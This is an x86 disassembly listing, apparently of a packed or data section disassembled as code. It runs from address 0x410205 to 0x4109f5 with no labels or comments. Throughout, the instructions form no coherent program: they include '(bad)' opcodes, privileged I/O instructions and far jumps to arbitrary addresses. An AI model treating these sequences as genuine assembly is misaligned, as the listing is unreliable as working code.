  410205:	in     eax,dx
  410206:	into   
  410207:	or     BYTE PTR [ebp+0x73ed8f74],0x2f
  41020e:	push   ebx
  41020f:	cwde   
  410210:	mov    edx,0x28ef03b2
  410215:	push   0x330fe620
  41021a:	int3   
  41021b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021c:	daa    
  41021d:	xor    al,0x31
  41021f:	ds mov ah,0xeb
  410222:	pop    esp
  410223:	fwait
  410224:	sub    DWORD PTR [eax+0x821b7a1],edi
  41022a:	ror    DWORD PTR [edx+ebx*1-0x18],cl
  41022e:	mov    edi,0x7198233b
  410233:	or     al,0xcf
  410235:	mov    DWORD PTR ds:0xab1321b4,eax
  41023b:	xchg   esi,eax
  41023c:	fdiv   QWORD PTR [esi+edx*2]
  41023f:	and    eax,0xe17f6aa3
  410244:	retf   0xbcdc
  410247:	gs inc esp
  410249:	paddq  mm5,QWORD PTR [ebp+0x7ed456d9]
  410250:	mov    edi,0xb430a1f3
  410255:	lock jae 0x4102ca
  410258:	mov    ecx,0x66ac98f6
  41025d:	out    dx,eax
  41025e:	popf   
  41025f:	retf   
  410260:	data16 jmp 0x410285
  410263:	push   eax
  410264:	jp     0x4102dd
  410266:	in     al,0xfc
  410268:	and    DWORD PTR [ebx-0x2c714c73],edi
  41026e:	retf   0x380
  410271:	std    
  410272:	mov    al,0xf7
  410274:	mov    esi,0xfe60c86f
  410279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41027a:	popa   
  41027b:	pop    esi
  41027c:	aad    0x47
  41027e:	or     DWORD PTR [eax],0xfffffff1
  410281:	or     DWORD PTR [ecx],ebx
  410283:	popf   
  410284:	retf   0x242c
  410287:	(bad)  
  410288:	mov    dh,0x56
  41028a:	les    edi,FWORD PTR [ebx]
  41028c:	and    BYTE PTR [edx],dh
  41028e:	in     eax,0xef
  410290:	pop    ebx
  410291:	loop   0x410310
  410293:	loop   0x4102f9
  410295:	push   cs
  410296:	clc    
  410297:	mov    ecx,0x7d716b15
  41029c:	mov    al,ds:0x71edd442
  4102a1:	(bad)  
  4102a2:	and    ebp,DWORD PTR [ebx-0x62c6c725]
  4102a8:	and    BYTE PTR [eax+0x60],bl
  4102ab:	jns    0x410245
  4102ad:	and    BYTE PTR [eax-0x45],cl
  4102b0:	ins    BYTE PTR es:[edi],dx
  4102b1:	fsubr  DWORD PTR [edi]
  4102b3:	js     0x41027e
  4102b5:	inc    esp
  4102b6:	cmc    
  4102b7:	add    eax,0x85acfc02
  4102bc:	lock ss call 0xb3eb:0xbdd6105e
  4102c5:	push   ecx
  4102c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102c7:	and    bh,BYTE PTR ds:0xc83b0812
  4102cd:	es inc ebx
  4102cf:	leave  
  4102d0:	pop    esp
  4102d1:	pop    esp
  4102d2:	adc    al,0x67
  4102d4:	inc    eax
  4102d5:	and    edi,DWORD PTR [esi]
  4102d7:	aam    0xcf
  4102d9:	xlat   BYTE PTR ds:[ebx]
  4102da:	push   ebx
  4102db:	mov    ds:0x82bc54cf,eax
  4102e0:	dec    esi
  4102e1:	xchg   edx,eax
  4102e2:	mov    esi,0xb8146fa
  4102e7:	sub    al,0xa4
  4102e9:	imul   ebp,DWORD PTR [esi-0x7f],0x4f
  4102ed:	(bad)
  4102f2:	data16 aas 
  4102f4:	addr16 and al,0x19
  4102f7:	iret   
  4102f8:	cmc    
  4102f9:	add    al,0x48
  4102fb:	jl     0x4102ed
  4102fd:	enter  0x8bd6,0x42
  410301:	pushf  
  410302:	ss fwait
  410304:	aas    
  410305:	and    DWORD PTR [esi+0x5d],ebp
  410308:	fstp   DWORD PTR [ebp+0x51656a81]
  41030e:	(bad)  
  410310:	mov    ebx,0x53f60663
  410315:	jge    0x410386
  410317:	mov    ds:0xf3214982,al
  41031c:	push   es
  41031d:	es leave 
  41031f:	or     eax,0x8c98b114
  410324:	xchg   ebx,eax
  410325:	std    
  410326:	mov    cr5,esi
  410329:	dec    ecx
  41032a:	inc    ecx
  41032b:	icebp  
  41032c:	mov    cl,0xf
  41032e:	sub    DWORD PTR [edx-0x39],edi
  410331:	ins    BYTE PTR es:[edi],dx
  410332:	xlat   BYTE PTR ds:[ebx]
  410333:	fwait
  410334:	arpl   di,dx
  410336:	mul    BYTE PTR cs:[ebp-0x145e45c8]
  41033d:	aad    0xcb
  41033f:	mov    al,ds:0x5bcd7078
  410344:	ficomp DWORD PTR [eax+0x37]
  410347:	or     BYTE PTR ds:0xd8285802,0x8a
  41034e:	cmp    BYTE PTR [ecx],dh
  410350:	and    al,0x3
  410352:	jg     0x410302
  410354:	push   cs
  410355:	ins    BYTE PTR es:[edi],dx
  410356:	into   
  410357:	xor    BYTE PTR [esi],0xf8
  41035a:	loop   0x4103b7
  41035c:	clc    
  41035d:	push   ebp
  41035e:	iret   
  41035f:	fld    DWORD PTR [esi]
  410361:	lea    edi,[ebx]
  410363:	retf   
  410364:	pop    ebx
  410365:	push   edx
  410366:	jecxz  0x410306
  410368:	cmc    
  410369:	jecxz  0x410350
  41036b:	pop    edx
  41036c:	xchg   ebx,eax
  41036d:	pop    ds
  41036e:	cmp    al,0x7
  410370:	sub    bh,bh
  410372:	sub    BYTE PTR [edx-0x41999d75],0xbb
  410379:	add    esi,DWORD PTR [ebx-0x5f]
  41037c:	inc    ecx
  41037d:	mov    al,ds:0x558fca7d
  410382:	(bad)  
  410383:	jp     0x4103c6
  410385:	aam    0xcb
  410387:	add    al,0x64
  410389:	test   DWORD PTR [edx-0x22],esi
  41038c:	adc    dh,BYTE PTR [eax]
  41038e:	pusha  
  41038f:	mov    bh,0x29
  410391:	ins    DWORD PTR es:[edi],dx
  410392:	inc    eax
  410393:	shl    DWORD PTR [ebp-0xd],0x44
  410397:	les    edx,FWORD PTR [esi-0x4bc5c6ae]
  41039d:	bswap  edx
  41039f:	mov    bl,0xf9
  4103a1:	push   edx
  4103a2:	cmc    
  4103a3:	jne    0x4103e4
  4103a5:	mov    ah,0x73
  4103a7:	add    BYTE PTR [edi],bh
  4103a9:	rcr    BYTE PTR [eax],1
  4103ab:	inc    esp
  4103ac:	inc    esi
  4103ad:	dec    esp
  4103ae:	stos   DWORD PTR es:[edi],eax
  4103af:	cdq    
  4103b0:	push   es
  4103b1:	test   edi,esp
  4103b3:	leave  
  4103b4:	bound  esp,QWORD PTR [edi-0xb]
  4103b7:	push   eax
  4103b8:	jmp    0x77f37c0
  4103bd:	sbb    ecx,edx
  4103bf:	push   ds
  4103c0:	pop    edx
  4103c1:	jbe    0x41038e
  4103c3:	jmp    0x42dd:0x17e274c8
  4103ca:	pop    ss
  4103cb:	in     eax,0x2c
  4103cd:	shl    cl,0xd0
  4103d0:	out    0x6f,eax
  4103d2:	mov    esi,0x82667248
  4103d7:	mov    ebx,0x125142b9
  4103dc:	in     eax,dx
  4103dd:	pop    eax
  4103de:	aam    0x48
  4103e0:	dec    esi
  4103e1:	pop    es
  4103e2:	fistp  WORD PTR [eax+eiz*8]
  4103e5:	jnp    0x41043b
  4103e7:	mov    eax,ds:0xf3a5784c
  4103ec:	jge    0x41044d
  4103ee:	pop    ebx
  4103ef:	cmp    esi,DWORD PTR [edi]
  4103f1:	or     edx,DWORD PTR [ecx+edx*2-0x58]
  4103f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103f6:	scas   eax,DWORD PTR es:[edi]
  4103f7:	cmp    DWORD PTR [esp+ebp*8+0x7b9aa1a1],0x7baeedab
  410402:	iret   
  410403:	mov    ebp,0xa67bd21e
  410408:	dec    ebp
  410409:	cmp    al,0xe
  41040b:	or     eax,esi
  41040d:	test   BYTE PTR [eax],bh
  41040f:	or     ebp,edi
  410411:	pop    ebx
  410412:	and    dh,BYTE PTR [eax]
  410414:	or     DWORD PTR [edi-0x14],edi
  410417:	jmp    0x410475
  410419:	cmp    DWORD PTR [ecx+ecx*4],0x8f8bfa92
  410420:	ret    0x9814
  410423:	sub    eax,DWORD PTR [ecx+0x799dfb83]
  410429:	pop    ecx
  41042a:	daa    
  41042b:	daa    
  41042c:	fs mov ebx,0xa036aa03
  410432:	add    BYTE PTR [edi-0x70a0866f],dh
  410438:	icebp  
  410439:	fcmove st,st(0)
  41043b:	aaa    
  41043c:	sub    BYTE PTR [esi+edi*2],cl
  41043f:	mov    edi,0xea1b2923
  410444:	sub    eax,0xf611d319
  410449:	sbb    esp,edi
  41044b:	repnz loopne 0x41048e
  41044e:	jbe    0x41041d
  410450:	out    dx,eax
  410451:	inc    edi
  410452:	and    edx,DWORD PTR [eax]
  410454:	xor    eax,ebx
  410456:	je     0x4104cd
  410458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410459:	(bad)  
  41045a:	icebp  
  41045b:	inc    ebx
  41045c:	pop    bx
  41045e:	jecxz  0x410449
  410460:	hlt    
  410461:	jb     0x41046e
  410463:	sub    eax,0x6289d8cf
  410468:	mov    WORD PTR [ecx],?
  41046a:	mov    edx,0x4168d8e2
  41046f:	stc    
  410470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410471:	(bad)  
  410472:	push   ebx
  410473:	push   es
  410474:	jbe    0x41045f
  410476:	inc    edi
  410477:	bound  esp,QWORD PTR [edi+0x25054029]
  41047d:	icebp  
  41047e:	mov    es,eax
  410480:	and    dh,BYTE PTR [ebx]
  410482:	outs   dx,BYTE PTR ds:[esi]
  410483:	pshufw mm6,QWORD PTR [ebp-0x76],0xf7
  410488:	and    al,0xfa
  41048a:	inc    esi
  41048b:	jbe    0x410431
  41048d:	mov    DWORD PTR [eax+eiz*4-0x23],edi
  410491:	mov    eax,0x823fc94e
  410496:	shl    BYTE PTR [bp-0x178c],0x78
  41049c:	add    ebx,0xdeb7252e
  4104a2:	clc    
  4104a3:	pop    ss
  4104a4:	xchg   edi,eax
  4104a5:	sub    edi,esp
  4104a7:	das    
  4104a8:	sbb    al,0x30
  4104aa:	stos   BYTE PTR es:[edi],al
  4104ab:	rcr    ecx,0xe4
  4104ae:	rol    ebx,0xba
  4104b1:	add    BYTE PTR [edx-0x68f1ba88],ch
  4104b7:	(bad)  
  4104b9:	or     al,0xb8
  4104bb:	and    ch,BYTE PTR [ebp+0xde2e08b]
  4104c1:	clc    
  4104c2:	xor    al,0xb3
  4104c4:	cmp    BYTE PTR [esi+ebx*1+0x78],0xd1
  4104c9:	fwait
  4104ca:	sbb    al,ch
  4104cc:	imul   esp,eax,0x401f37e1
  4104d2:	das    
  4104d3:	pushf  
  4104d4:	xchg   esp,eax
  4104d5:	fs cs clc 
  4104d8:	daa    
  4104d9:	in     eax,0x32
  4104db:	pop    ecx
  4104dc:	adc    DWORD PTR [edx+0x6d435a25],edx
  4104e2:	add    eax,0xc3977998
  4104e7:	cmp    al,0x8e
  4104e9:	xchg   edx,eax
  4104ea:	aad    0x5f
  4104ec:	mov    eax,0x1d737ed2
  4104f1:	pop    es
  4104f2:	popf   
  4104f3:	repz pop es
  4104f5:	and    eax,0xb436ccb9
  4104fa:	rcl    DWORD PTR [eax+0x7c],cl
  4104fd:	lock retfw 
  410500:	pop    ebx
  410501:	lea    edi,[ebp-0x42]
  410504:	retf   
  410505:	mov    ds:0xbabcf194,eax
  41050a:	loop   0x410584
  41050c:	out    0xab,eax
  41050e:	repz loope 0x41058c
  410511:	ret    
  410512:	or     BYTE PTR [edx-0x3af07041],ah
  410518:	dec    esp
  410519:	add    al,0x6e
  41051b:	push   es
  41051c:	imul   edi,DWORD PTR [ebp+esi*4+0x65],0x861f1e7b
  410524:	or     DWORD PTR es:[eax-0x1403f24f],ebp
  41052b:	in     eax,dx
  41052c:	mov    eax,ds:0x662ae9cf
  410531:	sti    
  410532:	push   ss
  410533:	xlat   BYTE PTR ds:[ebx]
  410534:	jle    0x41053a
  410536:	xchg   DWORD PTR [eax-0x75],esi
  410539:	pop    edi
  41053a:	(bad)  
  41053c:	sbb    BYTE PTR [esi],dl
  41053e:	add    dh,bh
  410540:	xchg   DWORD PTR [ebp-0x1b],ecx
  410543:	pop    esi
  410544:	mov    ds:0xc8bc8242,al
  410549:	cmp    eax,0x9eab3d2b
  41054e:	add    eax,0x9a525d31
  410553:	xchg   ecx,eax
  410554:	or     DWORD PTR ds:0x690260f3,edi
  41055a:	xchg   BYTE PTR [ebx],dl
  41055c:	xlat   BYTE PTR ds:[ebx]
  41055d:	push   ebp
  41055e:	int3   
  41055f:	inc    edx
  410560:	pushf  
  410561:	mov    ds:0x6935b58,eax
  410566:	leave  
  410567:	xor    dh,BYTE PTR [ebx-0x6c95c67d]
  41056d:	and    eax,0x253a8ac6
  410572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410573:	mov    ds,WORD PTR [esi-0x72]
  410576:	xchg   edi,eax
  410577:	pusha  
  410578:	int    0x1c
  41057a:	sbb    ah,bh
  41057c:	or     DWORD PTR [edx-0xb],ebp
  41057f:	jle    0x410513
  410581:	popf   
  410582:	(bad)  
  410583:	out    0xaf,al
  410585:	out    0xcb,eax
  410587:	bound  ebp,QWORD PTR [edx+0x39]
  41058a:	pop    es
  41058b:	sar    DWORD PTR [eax-0x409799b4],0x61
  410592:	je     0x410548
  410594:	adc    dl,bl
  410596:	fs mov esi,fs
  410599:	outs   dx,BYTE PTR ds:[esi]
  41059a:	stos   DWORD PTR es:[edi],eax
  41059b:	mov    cx,0xd72f
  41059f:	cwde   
  4105a0:	jmp    0x655a:0x729b1f74
  4105a7:	xlat   BYTE PTR ds:[bx]
  4105a9:	mov    bl,BYTE PTR [edx+esi*8-0x6350912c]
  4105b0:	sbb    eax,0x8e990dd2
  4105b5:	fwait
  4105b6:	je     0x41055c
  4105b8:	jge    0x4105d1
  4105ba:	jle    0x410605
  4105bc:	arpl   WORD PTR [edi+ebx*8],ax
  4105bf:	test   bl,0x78
  4105c2:	add    cl,cl
  4105c4:	push   edx
  4105c5:	and    DWORD PTR es:[ecx],0x4cd4e13f
  4105cc:	jmp    0x4a5196cd
  4105d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105d2:	mov    edx,esp
  4105d4:	jns    0x4105eb
  4105d6:	xchg   ebp,eax
  4105d7:	sbb    al,BYTE PTR [eax+eiz*2]
  4105da:	xchg   ebp,eax
  4105db:	iret   
  4105dc:	inc    eax
  4105dd:	mov    ecx,0xc621fc76
  4105e2:	mov    ebp,0x23066ae7
  4105e7:	repz jo 0x410620
  4105ea:	sub    bl,BYTE PTR ds:0xcbefac2f
  4105f0:	mov    edx,DWORD PTR [eax+0x50e24ff4]
  4105f6:	mov    cl,0x4
  4105f8:	mov    cs,WORD PTR [edx+0x9]
  4105fb:	gs mov ebx,0x88650ffc
  410601:	call   DWORD PTR [ebp-0x5ef686fb]
  410607:	or     BYTE PTR [ebx-0x7e],0x10
  41060b:	mov    al,0x7a
  41060d:	jae    0x410687
  41060f:	dec    ebp
  410610:	xchg   esi,eax
  410611:	jp     0x41059d
  410613:	stos   DWORD PTR es:[edi],eax
  410614:	fisub  WORD PTR [edi+0x4e]
  410617:	daa    
  410618:	test   BYTE PTR [esi-0x77e4e25f],ch
  41061e:	mov    cl,0xd0
  410620:	xchg   ecx,eax
  410621:	push   es
  410622:	dec    ecx
  410623:	gs ja  0x410627
  410626:	pop    ds
  410627:	fstp   QWORD PTR [ecx]
  410629:	ja     0x410630
  41062b:	adc    eax,0x7a82cfdc
  410630:	mov    al,0xbf
  410632:	aaa    
  410633:	mov    ds:0xfb5a63df,al
  410638:	sbb    BYTE PTR [esi],dh
  41063a:	test   BYTE PTR [ecx-0x5ddcc21],ch
  410640:	test   eax,0x13d82d4d
  410645:	dec    esp
  410646:	cmp    al,BYTE PTR [ebx-0x1c]
  410649:	shl    BYTE PTR [ebp-0x1b],0x1a
  41064d:	sbb    DWORD PTR [esi-0x69],edx
  410650:	mov    fs,ebp
  410652:	outs   dx,DWORD PTR ds:[esi]
  410653:	out    0xfb,eax
  410655:	mov    ebp,0xbd5d5b01
  41065a:	or     cl,BYTE PTR [ebx-0x6c209aae]
  410660:	xchg   ebx,eax
  410661:	data16 add dh,bl
  410664:	inc    edx
  410665:	leave  
  410666:	mov    al,0x94
  410668:	neg    BYTE PTR [esi-0x20023e84]
  41066e:	scas   eax,DWORD PTR es:[edi]
  41066f:	hlt    
  410670:	leave  
  410671:	mov    eax,0xb167718a
  410676:	inc    ecx
  410677:	out    dx,eax
  410678:	mov    DWORD PTR [edi],ebx
  41067a:	pop    ebp
  41067b:	xor    dl,bh
  41067d:	in     eax,dx
  41067e:	or     eax,0x37314fce
  410683:	cwde   
  410684:	jno    0x41069d
  410686:	add    al,0x9b
  410688:	mov    eax,ds:0x8d431baa
  41068d:	clc    
  41068e:	ficomp DWORD PTR [ecx-0x7030f4c1]
  410694:	lods   eax,DWORD PTR ds:[esi]
  410695:	out    dx,al
  410696:	or     eax,0x556e18
  41069b:	je     0x410708
  41069d:	stc    
  41069e:	or     BYTE PTR [edi-0x248c09e7],bl
  4106a4:	add    ebx,DWORD PTR [edi+0x38]
  4106a7:	dec    esi
  4106a8:	mov    bh,0x88
  4106aa:	sub    al,BYTE PTR [esi+esi*1+0x3523f6a4]
  4106b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106b2:	sub    BYTE PTR [ebx],bh
  4106b4:	pop    ds
  4106b5:	ficomp DWORD PTR [eax+0x36d1b36a]
  4106bb:	pop    ebx
  4106bc:	sbb    DWORD PTR [edx],esp
  4106be:	dec    BYTE PTR [eax]
  4106c0:	mov    eax,ds:0xcf5f8240
  4106c5:	mov    edx,0x9f1bf5b8
  4106ca:	fstp   TBYTE PTR ss:[esp+edi*8+0x8]
  4106cf:	xchg   ebp,eax
  4106d0:	iret   
  4106d1:	inc    ebx
  4106d2:	cmp    DWORD PTR [edx-0x69],ebx
  4106d5:	sar    BYTE PTR [ecx],cl
  4106d7:	xor    esi,esi
  4106d9:	mov    edx,0xf2e146fd
  4106de:	les    ecx,FWORD PTR [ebx]
  4106e0:	pop    edx
  4106e1:	inc    edi
  4106e2:	mov    al,ds:0x1b1a09a1
  4106e7:	jecxz  0x410764
  4106e9:	pop    ebp
  4106ea:	js     0x4106d8
  4106ec:	mov    ah,0xb8
  4106ee:	add    eax,0xc20d3d39
  4106f3:	pop    ebx
  4106f4:	mov    ah,0xac
  4106f6:	cmp    edx,DWORD PTR [ebp+0x4e30c61]
  4106fc:	push   esp
  4106fd:	dec    edx
  4106fe:	cdq    
  4106ff:	push   esp
  410700:	cmp    ecx,ebp
  410702:	into   
  410703:	ins    BYTE PTR es:[edi],dx
  410704:	sub    DWORD PTR [esi],ebx
  410706:	and    DWORD PTR [esp+ecx*8+0x69ede9da],esi
  41070d:	in     al,dx
  41070e:	out    0x4,eax
  410710:	test   eax,0xcdddabac
  410715:	in     eax,dx
  410716:	dec    ebp
  410717:	adc    BYTE PTR [edx],0xce
  41071a:	jbe    0x410769
  41071c:	imul   edi,DWORD PTR [ebp-0x53],0xaf6a8199
  410723:	mov    esi,0x78d3b176
  410728:	xor    al,0x76
  41072a:	jb     0x41076c
  41072c:	and    al,0x4e
  41072e:	ficom  DWORD PTR [edi-0x23052a8]
  410734:	mov    BYTE PTR [ebx+0x2e],dh
  410737:	lods   al,BYTE PTR ds:[esi]
  410738:	(bad)  
  410739:	lods   eax,DWORD PTR ds:[esi]
  41073a:	xchg   BYTE PTR [esi+eax*2+0x62],dl
  41073e:	push   ebx
  41073f:	xchg   esi,eax
  410740:	repz adc eax,DWORD PTR [esi-0x1e3f2360]
  410747:	cmp    al,0xa8
  410749:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41074b:	sub    ebx,eax
  41074d:	xlat   BYTE PTR ds:[ebx]
  41074e:	shl    DWORD PTR [edx],0xd0
  410751:	or     ah,cl
  410753:	call   0x563d9066
  410758:	and    DWORD PTR [esi],ebp
  41075a:	dec    edi
  41075b:	mov    bl,0x16
  41075d:	or     eax,0xa71b6cb6
  410762:	(bad)
  410766:	sbb    al,0x20
  410768:	xchg   ecx,eax
  410769:	dec    eax
  41076a:	push   edx
  41076b:	xor    dl,al
  41076d:	jl     0x4107e3
  41076f:	outs   dx,DWORD PTR ds:[esi]
  410770:	aaa    
  410771:	cmp    DWORD PTR [eax],0xbb7b6f15
  410777:	sar    DWORD PTR [esi+0x64],1
  41077a:	repnz push cs
  41077c:	push   esi
  41077d:	stos   BYTE PTR es:[edi],al
  41077e:	std    
  41077f:	cli    
  410780:	in     eax,0xca
  410782:	xchg   DWORD PTR ds:0x595781e3,ebp
  410788:	mov    esp,0x77552618
  41078d:	ins    DWORD PTR es:[edi],dx
  41078e:	cmp    BYTE PTR [edi],bl
  410790:	inc    edi
  410791:	jge    0x4107f7
  410793:	sub    al,0x13
  410795:	jge    0x4107f9
  410797:	sar    ch,cl
  410799:	sbb    eax,0xcd73ab74
  41079e:	neg    DWORD PTR [edx+0x4d]
  4107a1:	push   edx
  4107a2:	gs inc edi
  4107a4:	mov    dh,0x4b
  4107a6:	inc    eax
  4107a7:	call   DWORD PTR [ebp+0x328d7e2a]
  4107ad:	cwde   
  4107ae:	ja     0x41076e
  4107b0:	test   eax,0x13c0a46c
  4107b5:	(bad)  
  4107b7:	dec    ebx
  4107b9:	adc    bl,BYTE PTR [eax]
  4107bb:	mov    ?,esi
  4107bd:	test   ch,ch
  4107bf:	ja     0x410794
  4107c1:	mov    ds:0x6c20b4d1,al
  4107c6:	push   ecx
  4107c7:	add    DWORD PTR [eax+0x57],ecx
  4107ca:	xor    BYTE PTR [edi+0x6c],dh
  4107cd:	mov    BYTE PTR [eax],cl
  4107cf:	xor    BYTE PTR [ecx],bh
  4107d1:	mov    ?,WORD PTR [ebp+eax*8-0x6baf51c1]
  4107d8:	sbb    al,0xeb
  4107da:	aad    0x4a
  4107dc:	sar    ecx,cl
  4107de:	sub    ebx,esi
  4107e0:	mov    eax,ds:0x30e49d0d
  4107e5:	loopne 0x4107e0
  4107e7:	shl    al,1
  4107e9:	adc    al,0x46
  4107eb:	test   al,0x2f
  4107ed:	dec    ebp
  4107ee:	jo     0x410832
  4107f0:	lahf   
  4107f1:	fucom  st(3)
  4107f3:	rcl    dl,0x0
  4107f6:	ins    DWORD PTR es:[edi],dx
  4107f7:	mov    edx,0x6e267b86
  4107fc:	(bad)  
  4107fd:	leave  
  4107fe:	and    DWORD PTR [esi],ebp
  410800:	or     eax,0x7e7b7b43
  410805:	adc    DWORD PTR [ebx-0x34],0xffffff8f
  410809:	push   0xf35f9cb6
  41080e:	bound  ecx,QWORD PTR [edi-0x1f664a8c]
  410814:	jg     0x41080d
  410816:	test   al,0x42
  410818:	btr    esp,edx
  41081b:	je     0x41084d
  41081d:	pop    ss
  41081e:	mov    ds:0x616ca989,eax
  410823:	(bad)  
  410824:	outs   dx,DWORD PTR ds:[esi]
  410825:	jns    0x410874
  410827:	ins    DWORD PTR es:[edi],dx
  410828:	shl    BYTE PTR [esi*2-0x5c6c5e09],1
  41082f:	fisttp WORD PTR [esp+ecx*1]
  410832:	stos   DWORD PTR es:[edi],eax
  410833:	out    0xb3,al
  410835:	xor    dh,BYTE PTR [ebp+0x14]
  410838:	adc    esp,eax
  41083a:	inc    edi
  41083b:	mov    al,0xa9
  41083d:	(bad)  
  41083e:	imul   ebp,ebp,0xffffffb7
  410841:	mov    dh,0x2d
  410843:	out    dx,al
  410844:	jl     0x410826
  410846:	jp     0x4107ff
  410848:	and    eax,0x1643ed06
  41084d:	push   ss
  41084e:	bound  ecx,QWORD PTR [eax-0x10]
  410851:	gs dec esp
  410853:	or     BYTE PTR [ebx+0x4e0967f9],bl
  410859:	ror    DWORD PTR [ebx],1
  41085b:	mov    eax,?
  41085d:	xchg   ebx,edi
  41085f:	dec    esp
  410860:	les    edx,FWORD PTR [esi-0x3f6fc416]
  410866:	jl     0x410886
  410868:	les    edi,FWORD PTR [ecx+0x15]
  41086b:	mov    ch,dh
  41086d:	stos   DWORD PTR es:[edi],eax
  41086e:	xchg   esi,eax
  41086f:	mov    ah,0x22
  410871:	scas   eax,DWORD PTR es:[edi]
  410872:	xchg   esi,eax
  410873:	push   ss
  410874:	mov    bh,dh
  410876:	jmp    0xf97:0xba88ee7c
  41087d:	arpl   WORD PTR ds:0x33c488b0,cx
  410883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410884:	mov    bh,0x7
  410886:	xlat   BYTE PTR ds:[ebx]
  410887:	fsub   QWORD PTR [esi-0x69dadc67]
  41088d:	jmp    0x4108a5
  41088f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410890:	test   BYTE PTR [esi+0x7d],dl
  410893:	jl     0x4108e4
  410895:	loope  0x410827
  410897:	sbb    eax,0x6a2892a4
  41089c:	adc    DWORD PTR [eax+0x53e7b9da],eax
  4108a2:	dec    ebp
  4108a3:	xor    DWORD PTR [ecx-0x1af32fd4],edx
  4108a9:	pusha  
  4108aa:	clc    
  4108ab:	loope  0x410853
  4108ad:	lock push esi
  4108af:	or     al,0xd
  4108b1:	mov    al,ds:0x8a77d45b
  4108b6:	inc    edi
  4108b7:	(bad)  
  4108b8:	(bad)  
  4108b9:	mov    eax,0xe51e9241
  4108be:	dec    ecx
  4108bf:	sbb    eax,0xf8e2f313
  4108c4:	ret    0x3969
  4108c7:	retf   0x9027
  4108ca:	mov    al,0xe3
  4108cc:	add    BYTE PTR [edi],bh
  4108ce:	fisub  WORD PTR [eax-0x22]
  4108d1:	aaa    
  4108d2:	mov    al,ds:0x489c02ed
  4108d7:	(bad)  
  4108d8:	std    
  4108d9:	sbb    eax,0x61bcd9c5
  4108de:	imul   ebp,DWORD PTR [eax],0x3d
  4108e1:	and    ch,BYTE PTR [ecx]
  4108e3:	xor    eax,eax
  4108e5:	mov    esi,0x253d0d49
  4108ea:	mov    ebp,0x1ee3b1bc
  4108ef:	jb     0x4108e3
  4108f1:	repz push ebp
  4108f3:	mov    ecx,DWORD PTR [edi-0x5a]
  4108f6:	shl    BYTE PTR [ebx],cl
  4108f8:	in     al,dx
  4108f9:	pop    ss
  4108fa:	stos   DWORD PTR es:[edi],eax
  4108fb:	jg     0x410967
  4108fd:	hlt    
  4108fe:	and    al,0xf
  410900:	xchg   ecx,eax
  410901:	repnz cmp edi,0xb20a3b6e
  410908:	dec    eax
  410909:	mov    ebp,DWORD PTR [edi]
  41090b:	jmp    0x1e8a47dc
  410910:	cwde   
  410911:	adc    ch,BYTE PTR [esi-0x77596765]
  410917:	lock adc eax,0x7750e8ab
  41091d:	not    ch
  41091f:	(bad)  
  410920:	jmp    0xeb64ea80
  410925:	icebp  
  410926:	int    0x11
  410928:	in     al,0xf9
  41092a:	mov    cl,0x45
  41092c:	iret   
  41092d:	jnp    0x410904
  41092f:	pusha  
  410930:	sub    ecx,eax
  410932:	ss push esi
  410934:	popf   
  410935:	lds    ebp,FWORD PTR [edx-0x53]
  410938:	ret    
  410939:	das    
  41093a:	jne    0x410984
  41093c:	push   cs
  41093d:	test   eax,0x233f04a1
  410942:	jns    0x4109a3
  410944:	loop   0x4108f7
  410946:	fcom   QWORD PTR [eax+eax*2-0x54]
  41094a:	loop   0x4109a1
  41094c:	sub    cl,BYTE PTR [eax+ebx*2]
  41094f:	in     eax,dx
  410950:	cmp    BYTE PTR [eax],bh
  410952:	push   esi
  410953:	mov    ecx,0x3775ed3
  410958:	xor    DWORD PTR [edx-0x4d4da5ab],esp
  41095e:	push   es
  41095f:	cmp    BYTE PTR [ecx+0x19489f40],al
  410965:	call   DWORD PTR [edi]
  410967:	sub    al,0x1
  410969:	gs sbb eax,0x7953f0bf
  41096f:	cmc    
  410970:	cmp    BYTE PTR [edi+ebx*8+0x66],ch
  410974:	sahf   
  410975:	or     eax,0x19570e24
  41097a:	cli    
  41097b:	dec    edi
  41097c:	inc    ecx
  41097d:	out    0xfd,al
  41097f:	xor    DWORD PTR [esi-0x74975f1b],eax
  410985:	jne    0x4109d8
  410987:	outs   dx,BYTE PTR ds:[esi]
  410988:	out    0xfe,eax
  41098a:	repz in al,dx
  41098c:	jmp    0xa1b5:0x8c57b77a
  410993:	xchg   ebx,eax
  410994:	les    ecx,FWORD PTR [esi-0x7f]
  410997:	jno    0x410944
  410999:	cmp    BYTE PTR [esp+ebx*8],ch
  41099c:	test   eax,0x528e8958
  4109a1:	jecxz  0x4109c7
  4109a3:	imul   dl
  4109a5:	mov    edi,0xf75cde03
  4109aa:	sub    al,0xe
  4109ac:	lods   al,BYTE PTR ds:[esi]
  4109ad:	mov    eax,0x5840e511
  4109b2:	push   edi
  4109b3:	or     BYTE PTR [eax+0x20],dl
  4109b6:	xchg   edi,eax
  4109b7:	int3   
  4109b8:	pusha  
  4109b9:	mov    ecx,0x6c8ebc6d
  4109be:	shl    BYTE PTR [edx-0x16a57808],1
  4109c4:	inc    ecx
  4109c5:	in     eax,dx
  4109c6:	outs   dx,DWORD PTR ds:[esi]
  4109c7:	sbb    eax,0xff2ff69a
  4109cc:	in     al,0xfc
  4109ce:	in     al,dx
  4109cf:	popf   
  4109d0:	xchg   edi,eax
  4109d1:	inc    ebp
  4109d2:	aad    0x74
  4109d4:	inc    esp
  4109d5:	lock cmc 
  4109d7:	fwait
  4109d8:	push   esp
  4109d9:	adc    al,0xad
  4109db:	push   esp
  4109dc:	jne    0x410a2c
  4109de:	xchg   ecx,eax
  4109df:	cmp    eax,0xb1566797
  4109e4:	mov    ds:0x6bafae4e,eax
  4109e9:	out    0x8e,eax
  4109eb:	mov    dh,0x58
  4109ed:	inc    esp
  4109ee:	jl     0x410a31
  4109f0:	ret    0xbc41
  4109f3:	aad    0xcd
  4109f5:	rol    BYTE PTR [ebx],0x83
